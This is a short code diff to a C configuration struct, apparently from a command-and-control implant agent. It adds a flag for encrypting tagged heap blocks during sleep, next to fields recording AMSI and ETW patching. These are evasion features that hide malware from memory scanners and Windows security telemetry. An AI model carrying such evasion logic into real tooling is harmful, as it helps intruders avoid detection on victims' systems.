@@ -134,6 +134,8 @@ typedef struct
             BOOL  CoffeeThreaded;
             BOOL  CoffeeVeh;
             ULONG DownloadChunkSize;
+            /* ARC-04: encrypt sentinel-tagged heap blocks during sleep */
+            BOOL  HeapEnc;
             /* Process-wide in-memory bypass state (ARC-01) */
             BOOL  AmsiPatched;
             BOOL  EtwPatched;
